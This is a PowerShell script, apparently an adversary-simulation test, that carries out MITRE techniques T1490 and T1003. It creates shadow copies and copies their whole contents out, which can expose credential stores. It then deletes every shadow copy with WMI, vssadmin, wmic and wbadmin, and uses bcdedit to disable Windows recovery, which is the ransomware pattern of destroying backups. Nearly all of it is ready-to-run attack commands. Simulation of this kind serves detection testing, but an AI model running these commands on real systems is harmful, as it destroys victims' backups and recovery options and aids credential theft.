<#
    T1490 - Inhibit System Recovery
    T1003 - OS Credential Dumping
    - Create a shadowcopy
    - List all the shadow copies, create a symlink for each of them and copy the content of each shadowcopy to a "backup" folder
    - delete all shadow copies and disable automatic shadowcopy
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

# Create a shadow copy method 1
(gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')

$destination = $args[0]
if (-not $destination) {
    $destination = ".\"
}

if (!(Test-Path -Path $destination)) { 
    New-Item -ItemType Directory -Path $destination
}

#get the list of shadowcopies
$shadows = Get-WmiObject -Class Win32_ShadowCopy

#create a symbolic link of each shadowcopy and copy the content of each shadowcopy into a bacup folder in the choosen directory (choose a directory with enought space)
foreach ($shadow in $shadows) {
    $date = (Get-Date).ToUniversalTime().Subtract([datetime]'1/1/1970').TotalSeconds
	$shadowPath = $shadow.DeviceObject + "\"
    $destinationlnk = $destination + "\$date" + "_shadow_copy_" + $shadow.ID
    cmd.exe /c mklink /d $destinationlnk $shadowPath
    Copy-Item $destinationlnk -Destination $destination\backup\ -Recurse
}

#Delete all shadow copy
#method 1
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
#method 2
vssadmin.exe delete shadows /all /quiet
#method 3
wmic shadowcopy delete
#method 4
wbadmin.exe delete catalog -quiet

# disable automatic Windows recovery features by modifying boot configuration data
bcdedit.exe /set bootstatuspolicy ignoreallfailures
bcdedit.exe /set recoveryenabled No

Stop-Transcript
